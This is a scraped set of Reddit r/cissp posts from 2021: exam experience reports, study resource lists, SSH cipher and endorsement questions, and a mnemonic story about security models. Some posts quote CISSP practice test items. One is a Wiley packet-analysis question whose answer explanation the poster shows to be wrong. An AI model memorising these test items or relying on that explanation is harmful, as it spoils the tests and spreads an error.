* TEST TAKING. Practice tests count for a TON and gets you in the mindset.  Don't cheat on them.  If you're struggling, make them smaller, even if it's just 1-5 questions.  Get to where you are comfortable and then work your way up.  Whether you miss a question OR EVEN IF YOU GET IT RIGHT, read the explanation and refer back to the books.  Retake missed questions.
* REDDIT. Read your colleagues' experiences, but also be aware that there are some amazing resources here, including the actual authors of study guides and books, and professional trainers.  They don't hide, and don't be afraid to reach out.
* YOUTUBE.  There's so many free videos out there, and many are wonderful at getting the fundamentals ingrained in your mind.

Things I didn't do:

* Read any book cover-to-cover.  I didn't have time or inclination.
* Keep testing myself on subjects I was already familiar with.  For example, I knew I was strong in forensics, but weak in encryption.  So I focused more on encryption until I got comfortable with it.

Specific tools I used to study:

* BOSON.  I will swear up and down that Boson is what got me through this.  They've updated to the 2021 material.  The explanations for answers are top-notch.  By test day I was scoring 95%-100% on full exams.  The only (\*tiny\*) complaint I have about it is that the online version of the test doesn't let you create a custom exam to skip questions you've already answered X number of times, which the local installation does.
* CISSPREP. I hated this test bank with a passion, because it was so hard.  I never broke about 65% on it.  However, its questions really made me think, and were not just rote memorization answers.  I can definitely see the value in the questions it asks, but that doesn't mean I enjoyed taking them.
* ALL IN ONE CISSP EXAM GUIDE, 5th edition.  This one is a carryover from 2010 but was still really helpful, particularly in how security models came to be.  I'd obviously recommend getting the latest edition, but even the older ones still have merit.
* CISSP CBK 2015.   Also older, but still has merit.  Obviously don't seek out an older CBK, but work with what you have, and if someone gifts you older books or you have something in your personal library, don't throw them out.
* Most of all, /u/benmalisow one of the aforementioned authors and trainers active on /r/cissp, who was extremely generous with his time and helpfulness.

As I said above, ***you can do it!***  

It's challenging, yes.  

It's not the hardest test I've ever taken (EnCE was exponentially harder) but I did stop at some questions and just stare at them for a couple of minutes.  Other questions I answered in about 10 seconds.

I took a classroom CISSP course at the beginning of the year and forgot about the exam. 2 weeks ago I decided to take it on and I passed on 1st try :).

With that said, the most applicable credential to what I do now is the CISA, but everything I've heard suggests that it's not that challenging for someone with a strong auditing background. My ultimate goal for the next year or two is to get the CISSP, as this sub and other resources suggests it holds the most weight for someone who wants to get into management. However, I don't have a strong background in IT or good study skills, so I'm thinking that taking the Sec+ and Network+ first would make the most sense; the area I'm unfamiliar with is how much those two relate to the CISA.

After an intense 5-day training course and a week of practicing exam questions, I took and passed the CISSP exam. It took me a little over an hour before I got the notification that the test was over. I just wanted to share my experiences for anyone who is planning to take the exam.

As many have already pointed out, the real exam is quite different from the practice exams. That doesn't mean that you'd be wasting your time doing the practice exams though.

In my experience, memorizing the correct answers (from practice exams) will not help you to prepare for the real exam. However, doing the practice exams can help you to read the questions (very) carefully. Sometimes, it takes only one word to completely change the meaning of the question (and subsequently the correct answer to it). When doing practice exams, I noticed that I usually finished them a lot faster than required. This encouraged me to take my time during the real exam.

I found the questions from the real exam to be more varied and less ""gruelling"" than the practice exams. 

One piece of advice I can give you is to really take the time to read and understand the question carefully. You have more than enough time to read it multiple times but once you answer it and move to the next one, you can't go back.

Good luck with your exam!",2021-08-03

1607,owdfw6,Fun CISSP Practice Question,"\*\*Admin(s) Please Delete If Not Helpful\*\*

By the end of 1989, the price of ROM chips was dropping enough that Capcom game designers Akira Nishitani and Akira Yasuda began their ambitious plan for Street Fighter 2. Senior management asked the two designers to stay in-line with the original game and keep it straight forward. Management also asked for a quick turnaround to compete with other upcoming game releases such as Midway’s Mortal Kombat.

While the designers wanted to stay within the confines of the original game structure, they also wanted the freedom to try new things during development with the new ROM chips. Their goal was to create a list of skilled and iconic characters each with their own special abilities. For example, the additional memory space allowed the character Guile to have his Low Kick flipped to look like an upside-down air kick. And as Dhalsim’s limbs started getting longer and longer with each development iteration, it could be counter-balanced by making the character move slower. E. Honda’s flying attack and Chun Li’s Spinning Bird Kick were also newly added memory spaces on the ROM boards. These moves pushed the game from realistic to unrealistic, and added to its charm.

48-bits of data were allocated on the game boards to accommodate these changes.

This resulted in characters slowly increasing their assigned memory while in production and sometimes required a quick fix. In order to make these constant changes, Nishitani and Yasuda needed an accelerated development process with the final end-result already defined, but with the flexibility to allow for improvements while prototyping designs, going back and cutting animation frames for memory conservation, and re-examining system motherboard architecture. The designers needed the ability to constantly build, demonstrate, and refine their game animation changes.

Which of the following software development models would best fit this environment?

A. Waterfall method  
B. Rapid Application Development  
C. Joint Application Development  
D. Spiral Model

My everyday job isn't technical or managerial, but i have done some light technical work here and there for the company the past 9 years I've been there. I thought the test was pretty technical. Especially domain 4, my greatest nemesis. 

Started studying beginning of May. I tried to read the shon harris book, but was overwhelmed (only got through 1/2 book) At the end of may, i took a few practice tests and got around 50%. Only studied about 3hrs on a good day, much less or none on busy days. 

June, used the 11th hour to get to know the domains and then go into detail with videos, research, and shon harris book. Started doing practice test questions every other day. Was feeling better in June.... Then life happened. Didn't study for ~3 weeks. I kept thinking i had time left to study in july. 

July comes and things don't cool downwith life stuff. I was thinking of rescheduling but my mom convinced me to keep my date. It will force me to study, which i agreed with. Didn't get any better. Was only able to study everyday for ~3hr. 

Took a week off work before the exam to cram. That was the bulk of my study time, but even on the week of, i studied 5-6hr. 

I think the practice tests i used were representative of the exam. The sybex practice questions were pretty good, especially in how it is worded. The questions were similar, but the answer choices in the actual exam were more tricky.
They were not as obvious as the practice tests. I was able to narrow questions down to 2 answers. I took too much time in the beginning 50q and didn't have enough time for the rest of the test. Ended up rushing the last bit. 

Knew i failed when the last few questions were straight forward and much easier. Got a lot of legal and regulatory questions that i didn't know because glossed over those in my studies.

Study materials: 
Shon harris all in one CISSP (mostly used to do practice tests. Did ~700q)

11th hour

Sybex 3rd edition practice tests (did ~200 questions. Bought too late in July) 

Destination mind map videos (watched each vid 2x + took notes) 

Cissp cram series (watched each video 2x + followed slides)

Day before exam listed to how to think like a manager by Luke Ahmed and eric conrad's cissp cram session 

My plan for the 2nd time (hopefully last): 
Boot camp. I'm really bad with self study and need some structure. Plus, can tell people in my life i have to go to school for a chunk of time

More practice questions. Want to do all the questions i have

Look for an audio book version of a prep book 

Study things in detail. Deeper understanding of the WHY! 

TLDR: didn't study enough, didn't pass. Time management and discipline are important. Cramming didn't work :(",2021-08-01
1612,ovu73a,Standard and safe ciphers,"
I am checking some Linux servers and can see ciphers for basically two: SSL and SSH.  For SSH I can see some deprecated ciphers like CBC, MD5, arcfour which needs to be removed. if I categorize ciphers for SSH, then they are 4 types: 1. Kex (diffie-hellman-group-exchange-sha256) 2. Server host key (rsa, dss) 3. Encryption (ctr, aes, chacha20-poly, cbc etc) 4. Mac-algorithms (hmac-sha2-256). 5 Compression (none)
1.	Could there be ciphers for other services else than SSL and SSH too that needs to be checked?
2.	Getting rid of older and deprecated ciphers (like arcfour, md5) are obvious but what about removing kex algorithm (like Diffie Helman), or Chacha20-poly etc?  Is there a standard list of ciphers for Linux servers, something recommended by NIST or else?
3. Will removing ciphers cause compatibility issues?
Thanks in advance.",2021-08-01
1613,ovd9rx,PASSED AT 150,"As the title says, my heart was pounding, sweat was flowing, and the questions kept coming. last year I did 4k study questions and didn't read the book, nor had the right managerial mindset, and got to question 129 only to fail. this year I did another 4k study questions but this time instead of Sybex online exams I used cccure and actually read the book (sorta skimmed it tbh) but most importantly I had a mindset that I was there to advise and not fix, and I made sure I picked an answer that was 'end game' and that encompassed technical steps that were listed as separate answers. had to go all the way to 150 questions and completely freaked the entire time. one other difference this time was that I asked to pull my mask down while at my station so I could actually breathe normally. that helped a lot!

Passed the exam today at 100qs and less than 2 hrs. Frankly, did not feel the exam to be too difficult. I was certain about most of the questions.

Studied: Sybex and official questions, Kelly's video on why will you pass the exam, Rob Witcher's Mind Maps, Prashant Mohan's Memory Palace and Think like a Manager.

Studied way too much, exam was in April, had to reschedule due to COVID, since course changed, booked it for July 30th.

My background: 3.5 years of Infosec exp (total experience), mainly into Audits and Risk Management. Have cleared CISA, CISM, CEH, AZ 900, ITIL. Did graduation in Cyber Security.

This was my problem. When I sat for the exam last week I got hit by lots of concepts I hadn't even heard of and failed.

Any advice on concepts apart from the official materials I should concentrate on for my re-test?

1619,ouob9r,Provisionally Passed Yesterday @ 150 Questions,"Hello all. I have been quietly following the CISSP reddit thread for the past two years. Before I get into the journey, I will tell you about my background. I have been in the IT industry for 15 years wearing many hats along the way. I was a managed services network engineer for most of it, although I also worked on systems and security in these roles. I was also an ISO/IT Manager for about four years in the financial industry. I am currently working as a network engineer in the media and broadcast industry. I currently hold CCNP r/S, MCSA/MCSE 2016, A+, Network+ and CISM.

&#x200B;

I have been studying for the CISSP off and on for the last two years. I was hoping to test in early 2020, but the testing centers closed for a while due to COVID. I studied the official study guide (read it cover to cover) and finished the 11th hour by Eric Conrad. This took about two weeks. I tried to read the Shon Harris edition, but I wasn't captivated by the writing style. It felt like reading a dictionary. The official guide was still a hard read, but I was able to keep up with the progression. I also used several practice tests including: the official practice tests, Boson, Shon Harris practice questions and PocketPrep. I would test myself on random questions and when I did poorly, I would review chapter material or concepts.

&#x200B;

After I learned that ISACA allowed online testing, I scheduled my CISM test for May of 2020. Unfortunately, I had technical issues logging into the exam environment so I was not able to take the test. Support did issue me a voucher to retake the exam, but I did not end up taking the exam until April 2021. Not wanting my voucher to expire, I studied the All-In-One study book for the CISM and used the QAE question bank to help (re)prepare. I thought both were essential for passing the CISM exam. I was able to pass the CISM when I took it in April 2021; thankfully I had no technical issues this time. The proctor had me scan the room, under the desk, etc. to ensure a secure test environment at home. It took about two weeks to have my work experience approved, maintenance fees, etc. until I was finally CISM certified.

&#x200B;

I told my employer about my new credentials and my interest in cybersecurity management. They requested I take the CISSP as it was viewed as a harder tested (I'll comment on that later). I ordered the ninth edition of the Official study guide and started my studies with a focused approach on my weak domains. I continued to use my practice tests to focus on these areas. I used PocketPrep and Boson for most of it. When I started using Boson, I was averaging 60-70%. After two months of studying, I was able to bring that up to 80-90% on average. I bought the CCCure questions, but only used them a few times. I heard on this forum that Boson was the best and I agree with that. I finally decided to schedule a date and get it done. I picked 7/29 as my test date and I was a nervous wreck leading up to the exam date. I felt I understudied, unprepared, etc. even though I have been studying hard for the last several months. I read the 11th hour book cover to cover to brush up on my topics. I read this until the late morning on the day of my test. My test was at 2 PM. I also watched the Kelly (Why you will pass the CISSP) video and Larry's videos and they will essential for gaining the right mindset. DON'T FIX ANYTHING!!! Cost benefit analysis for each solution. Management answers are always applicable. Focus on human life.

&#x200B;

I did a few Boson practice questions in the parking to get into the mindset of reading the questions slowly (once, twice), reading the answers slowly (once, twice). All the time to think like a manager, not an engineer. My heart rate was up and I was stressing out. I finally made my way into the testing center for the moment of truth. After the palm scans, NDA and all the processing, I finally started the exam. What I read on this forum was accurate. These were like no questions I have ever seen in my practice test bank. I had a handful that were like that, but most were scenario based. You have to completely understand the concepts and when to use them. I would read the question two or three times, figure out what they were asking and then select the appropriate or best answer. I also proved the other answers were incorrect or less accurate than the answer I chose. Several questions were way out of left field and I used an educated guess to eliminate the wrong answers. After going past 100 questions, I really thought I was headed for failure. I was thinking, all that studying and it is still not enough. I even visualized my next steps, like attending a boot camp. Nevertheless, I continued to answer each question as if it would make or break my passing grade. I finally got to question 150 with about an hour left and clicked finish exam. I was surprised it didn't have a survey like the other exams I have taken.

&#x200B;

I had to go through the checkout process (ID and palm scans again). The proctor verified my name on the printout and I noticed when she was holding it, it did not have bar graphs like I heard similar to a failure report. When she handed it to me, I saw ""Congratulations"" and said aloud, ""Well I wasn't expecting that."" haha I'm so glad I stuck with it and continued to fight for the win. I feel the networking questions pushed me over the top since that is my strongest area. I know I didn't ace it at 100 questions, but I tried my best and that is all that mattered to me. I look forward to the future this certification will bring. If anyone has tips on staying on top of the CE's, I would greatly appreciate it.

&#x200B;

I feel the CISM will help prepare you for the CISSP, but while they are similar, they are also very different. The CISM is more management focused without the high level technical knowledge required for the CISSP. Both exams were very challenging. CISM is paramount if you plan to pursue a Infosec Manager role and analyzing/reporting risk to C-level executives. There is a lot of overlap between the two, but studying for one doesn't necessarily prepare you for the other without additional study.

&#x200B;

Whatever your journey may be, I wish you all the best and I'm happy to answer any questions that do no break the NDA.

Some of the available resources are Thor Pederen's HARD CISSP Practice Questions. So far these are the trickiest and most confusing practice questions I have come across during my prep. Sometimes I feel like they are purposely trying to trick me by using specific words which start to make me over think. I was wondering if anyone else has been using these and if they are also finding them confusing and also wondering how similar these will be to the actual questions I will see. I have provided a sample below.

 ""J**ohn is creating a username for a new employee, Frank Hornsby. The company guidelines recommend the username ""hornsbp1"". The new employee has requested the username ""cowboy"", and there are no accounts with that name. Which username is John most likely to create, and what is the BEST reason?** ""

a. Cowboys because guidelines are optional and cowboy is unique 

b. hornsbpi, because cowboy would be too conspicuous and may attract attackers

c.  hornsbpi, because this format follows the guidelines

d. cowboyl, because this almost follows the guidelines and would not be too conspicuous

1623,oufquj,Provisionally Passed Yesterday!,"I have to honestly say at first, if you’re reading this, you are probably more intelligent than me. Seriously! I just happened to stumble across cybersecurity as I begin to prepare for retirement, and it’s turned into my new passion!

I have no factual background in IT or cybersecurity (I did get SEC+ in March). I’m an active duty Soldier who’s about to retire, and my specialty is in tactical radios and COMSEC. What probably helped me out the most was that I’d been a “manager” for almost 18 years. I do have pretty good knowledge of symmetric and asymmetric keys as a COMSEC manager, but that’s been my experience for the past 20 years.

I passed on my first attempt at 150 questions. I made sure to read everything super slow, and I took the entire three hours.

I used a ton of sources to make up for my experience and lack of knowledge.

Sources I used:

Study Notes and Theory - best overall source for content. The website and Facebook group are phenomenal. 

How to Think Like a Manager by Luke Ahmed - the 25 questions helped me with the manager mindset. Excellent!

Mike Chapple’s LinkedIn course - does a great job of delivering content, then applying it to real-world scenarios 

Sybex 8th & 9th editions 
Sybex Official questions
Shon Harris AIO
Wentz Wu The Effective CISSP
11th-hour study guide
Cissprep.net questions
Destination Certification videos by Rob Witcher
Kelly Handerhan videos
Prabh Nair’s YouTube videos

I used the Pomodoro method for my study routine.

I also used Anki a lot and this subReddit group.

The Sybex content prepared me for the technical part of the exam, the questions on Study Notes and Theory as well as How to Think Like a Manager and CISSPrep.net prepared me for the manager mindset. Mike Chapple’s LinkedIn CISSP class put everything together for me.

Those were my top three resources! But I needed all of them to pass!

My organization paid for an ISC(2) bootcamp and I had a fantastic instructor who provided excellent examples of ""demystifying"" complex subjects like encryption algorithms and frameworks.  I attended the bootcamp last week.

I only used the book as referenced by my bootcamp instructor and then occasionally during the ISC(2) official practice exams to review information that I missed.  I didn't read it cover-to-cover.

I also paid for a month subscription to the PocketPrep app to gain access to all of the questions and just hammered practice questions at night between my bootcamp last week and my exam this morning.

It stopped me at 100q after about 100 minutes.

I think experience had the biggest role in me passing.  I've done most everything covered by the domains, but there's also definitely a ""mindset"" that you have to put yourself in when you take the exam.  It was the same for the CISM.

1635,otq9aj,About a question from the Wiley CISSP test bank...,"Greetings everyone. I attempted the Bonus Exam from Wiley's Test Bank today, and one of the questions asked about a packet analysis scenario.

The questions goes like this:

>While performing network packet capture analysis, you discover packets that seem odd. By looking into the packet’s raw hex display, you see that the byte offset position 0x2F has the value of 0x08. What was this packet attempting to make occur?  
>  
>A. Abruptly disconnect a session  
>  
>B. Confirm the receipt of a data set  
>  
>C. Start a graceful hang-up process  
>  
>D. Initiate a new session connection

I pick A, the answer that this shows a reset, to abruptly end the connection, and Wiley says I'm right. It provides the following explanation which I'll copy and paste here:

>The raw hex value of 0x08 in offset position 0x2F represents the binary number of 00000100. When this binary number is compared to the TCP header flag (i.e., the offset position 0x2F) layout of XXUAPRSF, it is clear the Reset flag is set. Thus, this packet is attempting to abruptly disconnect a session.

This seems strange, because 0x08 is binary 00001000, so the explanation is one position off.

The layout of the control bits is correct, XXUAPRSF, and RST is indeed 00000100. But, that means the hex value should be 0x04 in both the question *and* the answer / explanation.

Furthermore, the offset position for the TCP header flag should be byte offset 13, i.e. TCP\[13\]. Why does it say offset position 0x2F?

It seems as if Wiley made several mistakes here. Either that, or I am losing my mind. Can you guys weigh in?

One last point is that I hardly think questions like this will appear in the actual exam. Packet analysis seems too far down in the weeds. What do you guys think?",2021-07-29

Let me start off by saying that I have about 10+ years of experience in InfoSec and most of the success of the exam was really not from the cramming session, but rather my real-world experience. 

&#x200B;

This was by far the weirdest exam I have ever taken. At no time, did I know or feel if I was doing well or not. The questions are worded in a way that many answers could be correct ones and I feel that this is what makes the test **'difficult'** for some. There were a lot of test-taking skills that I applied like the process of elimination and re-reading the question again to ensure I was understanding the question correctly. At the end of the day, I believe my experience and knowledge of infosec acquired over the years is what got me the pass.

&#x200B;

I just want to say you definitely don't want to memorize anything. The cramming session I did overnight was focused on a couple of areas I didn't feel comfortable with and I really just tried learning the concepts. Memorizing will definitely not help you in this test. Definitely need to understand concepts and take the test from the perspective of a 'Risk Consultant'. That really helped me.

&#x200B;

Anyways, I'm happy that I was able to pass and I'm also very thankful for the posts with resources people used to pass the exam that I was able to review the past month. I did use some. 

&#x200B;

Here's my list of resources that I used this week:

\- Eric Conrad's 11th Hour **( Read book overnight and today before exam, its a super quick read and very helpful)**

\- Sybex Official Study Guide **( reviewed only concepts I didn't understand quickly)**

1642,ot2yqd,CISSP Study aid short stories,"Hello everyone.

I have been having the hardest time remembering certain topics in the book, like the access models. So I decided that in order for me to remember these boring topics, I am going to write a story and hopefully I will remember. By writing here I am hoping it will help you study as well! I don't know if this idea is stupid/silly but I'm hoping it will help remember at the least the name and what each model does! The story may sound silly because I am just making this shit up, also my grammar sucks so please excuse me but I will write in a way so that each model is memorable :)

If you all like this, I can write more about other topics, so here goes nothing!

\-------------------------------------

It was a cold winter night in Virginia but it was hotter than ever in Washington DC with cybersecurity incidents across the Federal government. Something had to be done or else the USA was to going to lose the war against its enemies on the cybers fronts. We could beat anyone in physical battle, but how do we beat an enemy who knows no boundaries that you can't shoot or kill by a stealth bomber or a drone?

After being in traffic for hours on 66 East by the Key Bridge near Georgetown, Mr. Bell LaPadula had enough and took the exit near Roslyn to cross the bridge. ""Big mistake"" he explained ""the damn traffic worse up in here!"" After moving an inch every 30 minutes, he remembered why took this exit. He loved the view of the Potomak river, as the sun rose up over Kenndy Center. It was better than looking at a parking lot of cars.

Noticing how late he was running for work, he had no choice but to call his best friend Biba, a goofball who saw Mr. LaPadulla as this big military prick but loved like a brother nonetheless. They have been arguing for days about how to solve these Cybersecurity incidents. His biggest worry was to prevent insider threats, there has been a fear that there are Chinese spies now working in the ranks of the US government, they had found a way to get in and now no one could be trusted, not even our own...

Bell and Biba have been working together with Clark Wilson, an AirForce retire who loved sports cars, more especially Camaros, and their nerdy twin buddies Brewer and Nash who were obsessed with the Great Wall of China, but for some odd reason they always referred to it as Chinese Wall, LaPadulla never asked why... Together they made a great team solving the hardest IT Security problems.

However, Mr. Goguen Mesegur, a kiss-ass who was a title whore in the government world, always got in the way of LaPadulla. No matter how great of an idea he had, Goguen stopped him in order to push his own agenda. His biggest supports were Graham Denning, an IT Manager, and Mrs. Sutherland, an old-school mean lady who smoked way too many cigarettes, the type of person you wondered how she was still alive after smoking packets of cigarettes per day for many many years! If she called, you could even smell the cigarettes from the phone as soon as she said ""hello darling...""

1644,oswpx3,CISSP endorsement questions,"I'm currently studying for my CISSP and have some questions about who can actually endorse me.

I thought I just needed to prove 5 years of experience in the domains covered, I didn't realize that the person endorsing me has to also be ISC certified.

I am part of a two man IT team and would've had my boss endorse me. the scope of my job very much includes security.

However, while I have 5 years of security experience, my boss is not an ISC member. I'm also not particularly looking to jump ship once I'm certified (though id make a lot more money if I did.) How do I get my skills endorsed when I pass the CISSP exam?

Can my boss endorse me without a CISSP himself?

Can I be endorsed by a third party ISC2 member? If so, what will I need to show them to prove my experience?

For example, in the past five years I have:

- earned a CRTP certification

- built and tuned a SIEM solution based on graylog, elasticbeats, sysmon, and graylog sidecar. This system uses SIEM rules translated from the sigma project (to which I am a github contributor)

- developed the incident response plans and playbooks for our organization (a few hundred pages worth)

- planned and implemented CCTV and access control systems for all of our sites...

- ... along with matching surveillance and privacy policies specific to our region (were a govt agency subject to strict privacy laws)

- top 500 member of hackthebox.eu since 2017

- set up and perform monthly vulnerability assessments

- replaced all our firewalls and audited their rules and configurations

- wrote the RFPs for several new projects (including disaster recovery)

- been the primary responder to several ransomware incidents (at my previous job at an MSP)

- Developed security awareness programs for our staff (both knowbe4 and live demos such as demonstrating USB HID attacks to staff)

- formally specialized in infosec during my computer science degree

- write infosec articles in my spare time, several of which have been cited by large organizations including infosecinstitute (not that i like infosecinstitute, but whatever)",2021-07-27

1646,orz3bf,5 Tips For Passing The CISSP Exam,"Thought I’d share some of my top tips for passing the CISSP exam.

**#5 Read and Relate**

“I don’t understand, I read the Shon Harris book 3 times! How did I fail the exam?”

You read The Odyssey.

You read The Old Man and The Sea.

You read To Kill A Mockingbird.

You don’t read a CISSP study guide.  You must relate and understand a CISSP study guide.

Software Development Security was my weakest domain.  I’d turn my computer speakers up, and listen to a 2-hour video about Software Development Security on YouTube or CBT Nuggets.  Then, I’d proceed to forget everything in three days.  I don’t create software for a living, which is why I had a tough time relating the Software Development Life Cycle (SDLC) to the real world.

But I did work in network security for a living.  A job in which I applied cryptography concepts into action through the use of VPNs and SSH every single day.  This is why cryptography became my strongest domain, I had the ability to relate what I read in CISSP study guides.  I’d read about symmetric and asymmetric encryption, and then apply it for customer devices and environments.  It was awesome.

In an effort to increase my knowledge about the SDLC though, I Googled and YouTubed all I could.  I’d Google things like “iphone software development process”, or “SDLC process used by Facebook”.  I’d read about these real world examples to better relate it to the CISSP books.

I found out too late that the CISSP is actually not a memorization test, it’s a test of concepts.  Keep that in mind as you study!

**#4 Obsess**

“I tried to make the game perfection” – Michael Jordan

How do you get good at something? You have to keep doing it over and over again.  If you want to be a good basketball player, you gotta put in hours shooting in the gym, learning how to dribble tighter, run faster, and shoot more accurately.  Michael Jordan obsessed over the game, and went on to become a basketball legend, and accumulate an estimated net worth of $1 BILLION!

Michael Jordan was the totality of all his training.

I remember obsessing so much over the CISSP that sometimes I neglected my friends, family, and general hygiene.  When obsessing, it’s hard to let go.   While driving, going to sleep, or eating, my obsessive subconscious would still think of a problem, and continue to work on it.

Obsession can be dangerous mentally, but with proper control, it can be an effective productivity tool.

Luckily, you can start the obsession phase 2 months before you take the actual exam.  This is the time to sleep, breathe, and eat CISSP.  Just study it everyday right up until the exam so everything stays fresh in your brain.

**#3 Write**

Not type. Not email.  Not text.

Write.

Pencil and paper.

Read about vulnerability testing, and then draw out a network topology map and place the firewalls, IPS, IDS, and servers where they should belong.

Read about system ring architecture, and actually sketch the proper and secure path for a system process.

Read about the OSI Model and actually draw out how a packet starts at the application layer on Host A, and travels up the layer to Host B.

Let the information you read, flow from your brain, through your arms, and to the tip of your pencil.  When you get a question about a packet having issues at the network layer on the exam, your brain will recall back to your hand motion of writing about it on a piece of paper.

**#2 Trust Yourself**

Before actually taking the exam, all I heard was that the CISSP was an incredibly tough exam.  This was in the days of the 250 questions and 6 hours of total mess-with-your-mind torture exam.

This is true.  But I’m here to tell you that it is a completely passable exam! It’s not that difficult.  The only way to do it is to follow the same formula as everyone else who has passed.  Get some real life security experience, study the Shon Harris books, take an ungodly amount of practice exam questions, and mentally prepare yourself to sit in an exam room for a prolonged period of time while being mentally tested.

After completing about 180 questions during the exam, I actually started to feel fairly confident that I will pass.  Before taking the exam, I felt 60% confident that I’d pass, even though I studied for 10 months.  It is only after passing, that I realized I should’ve trusted myself 100%.

I’m trying to boost your confidence now, and not after the exam.  If you study well, you will be a CISSP.  It is not that difficult.

If you understand the concepts, and can truly see the big picture as it relates to information security, and have done your best to study for the exam, then trust yourself.  You will pass.

**#1 Don’t Give Up**

The alarm rings at 8:00 a.m., but it’s your day off.

You came home from a tough week of work, spent time with your family trying to hide your exhaustion, then finally collapsing into bed.

You deserve some rest.

Then your brains reminds you about that alarm you set early in the morning.  You still have an exam to take in 5 weeks.  You may have failed it the first time, but you’re definitely not going to fail it the second time.  You still have to read more about Common Criteria and Spanning Tree Protocol.  You still need to nail down all the steps in a forensic investigation process.

I can tell you not to give up a million times.  I can tell you that dedicating yourself to study for the CISSP is the only way to pass the first time, but it’s ultimately your decision.

Don’t give up.",2021-07-26

I am studying for the last 3 months. Making a study plan a day prior, checking if I can spend some time the following day studying for the exam. I am not over-stretching myself. Where-ever I see, read - on youtube, blogs, forums - there is a lot of fear mongering around the exam. The same kind as we had during high school exams, college exams, university exams and the freshers company placements exams. What happened - we did not learn anything by choice but by fear. What such fear mongering does is lowers our morale and we start considering this exam as our worth decider. 

I am just writing this post - to give a perspective - that this is just an exam! And especially designed for professionals - who work 8-10 hours a day, have other Misc. work, life crisis, relationships and in summary are adults with a whole lot of responsibilities. 

If you read this post, do study for the exam at your own pace, give your own best (don't read others opinion how tough the exam is) and then in the end it is just a result (Pass or Fail). No exam can value the minimum of 5 years of experience we all have in the Information Security Field. 

The exam is worth it for sure, to learn and test our knowledge but the kind of fearful stature we give to this exam should be stopped - we are adults and not students. We have experienced life and we know it will be Okay!

1652,or002m,Obligatory “provisionally passed” post,"Full disclosure: I earned a CISSP cert around 2003-04 that I held for 6 years and then let lapse. I wasn’t in a security-focused role in the job I’ve held for the last 16 years, and keeping up the CEUs wasn’t worth it. That being said, the CBK and the exam - as well as the industry in general - are radically different than they were then and I’ve never been in a “traditional” security role. My earlier test was the 6 hour paper exam on 10 domains that had very little overlap unlike the current 8. 

Prep: 1 month, OSG 8th edition, sample test companion book, ITPro.tv subscription (accelerated 2018 version, 2021 came out just before my test), mind map and exam cram YouTube series. I also credit Harry Lorayne and Josh Foer for the memory techniques that I made extensive use of in my studies.

If I had to prep over again I would’ve done the mind map series first before starting ITProTV and OSG. It would’ve given me a better 360 and a place to hang the specific concepts as I picked up more detail.

The adaptive testing is no joke. I honestly had no idea how well I was doing, or whether I was going to pass or fail when I got my results. I had no idea which questions were evaluated, and TBH was often not sure whether I knew the answer or not. I would have probably dreaded my results and felt like giving up if I hadn’t seen [this video](https://youtu.be/5nqqL1rjIY4). If you’re used to acing paper exams this will feel awful. I had to remind myself many times not to take ANYTHING too harshly in my mind.

&#x200B;

Top advice, spend as much time as you can in the [Certification Station](https://discord.gg/certstation) Discord channel. There you will find both what's the proper material, and relevant and authoritative discussions about the different topics.

I've compiled which sources I used in this [LinkedIn post](https://www.linkedin.com/posts/lucianovaschetti_today-i-defeated-the-beast-after-100-activity-6823330484798423040-ox-X)

&#x200B;

Although it's a Manager exam, it evaluates technical content, so you have to be comfortable with the vocabulary and how the technology works. That said, technology is not the most important to be evaluated.

As I've been told, there are really weird questions (although related, of course)

New topics come up, but being aware of them and knowing the inch deep is enough.

It's not worth memorizing anything (and I didn't), but understanding and being able to talk about the major processes (BCP, BIA, DRP, IR, SDLC)

Time wasn't an issue with the exam. On the contrary, 100 minutes were left, even without rushing into any question. Taking a few breaks to go to the bathroom and drinking water was really helpful.

The last days I relaxed and took walks while listening to Rob Witcher's mindmaps, and listening to different mindset videos on Youtube (Kelly, Larry, Seth Misenar / Eric Conrad)

&#x200B;

These videos helped me a lot, to be in the ""Think like a Manager"" mindset, I watched them several times:

[https://www.youtube.com/watch?v=v2Y6Zog8h2A](https://www.youtube.com/watch?v=v2Y6Zog8h2A)

&#x200B;

Something really helpful was to print the Exam Essentials from OSG 9, and reviewed them all, marking and putting comments to anything I wasn't sure about.

So, covering 100% of the topics (without memorizing anything like cable speeds) + a good mindset = being comfortable at the exam room.

Also, before entering the exam room, I took 5 minutes for myself and breathed with my eyes closed, listening to this one: [https://www.youtube.com/watch?v=AtF0T2fPvbI](https://www.youtube.com/watch?v=AtF0T2fPvbI)

&#x200B;

As for the questions in the exam:

\- Some of them were really direct /easy/straightforward (e.g. ""what's best for accomplishing ***this***). These ones would be like Boson.

\- Some of them were hard, in the sense that the purpose was hidden (they used other words different than the ones we're used to (e.g: Privacy instead of Confidentiality). These ones would be like Thor's

\- Some of them were really weird (assume most of that ones were non-graded) and I'd tried my best. These ones would be like Wentz's

I think there were 1/3 of each of those groups. Really, some of them weren't that hard

But.. for the first group, I had a (simple) networking question, or access control model questions, that if I didn't know the knowledge couldn't have answered.

Also looking back on my journey is through the lens of what I know now, I might be overly critical of some resources. *To that end* I may be over-critical of some resources as not being helpful, but as it's difficult to divorce my viewpoints from my perspective to that end, I'll just give you as honest-as-possible evaluation of what I used.

My main takeaway is: The most productive parts of my journey were a tight feedback loop of practice exams, identifying weak points, studying, and repeat. 

# Before CISSP

I have \~9 years of IT/technical experience, 4+ of which was a wide-spread role containing cybersecurity, IR, limited forensics, DLP, and security tool administration. The last 9-10 months have been as a Cloud Security Architect. All of this has been at the same organization, a Fortune 100 enterprise.

Previously I've obtained the following certifications that the studying of helped (at least in part) for the CISSP:

* Security+
* SANS GCIH
* CEH (Masters)
* Cloud+
* AWS Certified Cloud Practitioner
* AZ-900
* AZ-104

In addition I took the OSCP class, and worked some of the labs, but did not attempt the exam. Retaking the class and reattempting the exam is a 2022 or 2023 goal for me.

# Studying for the CISSP

I began with the 11th hour. I guess it was nice, but it felt way too high level. I know a lot of people say this is a great last-minute prep, but I really can't agree with that. It was so high level and detail-lacking I can't really see the value. I guess it was a nice first pass? In hindsight, the [CISSP Mindmap video](https://www.youtube.com/playlist?list=PLZKdGEfEyJhKWyryIvx_jm1jn6ZMTi7gW) series would have been a much better first pass. Note, I didn't study the 11th hour, just read through it once.

I also listened through, twice (just because it was long-car-trip material) the [Essential CISSP by Phil Martin, Second Edition](https://www.amazon.com/Essential-CISSP-Exam-Guide-Knowledge/dp/B07JDJV47Z). I thought it did a decent job, and if you would like to study during car trips, it's the best audio book I found. I tried some others, but I wouldn't recommend them.

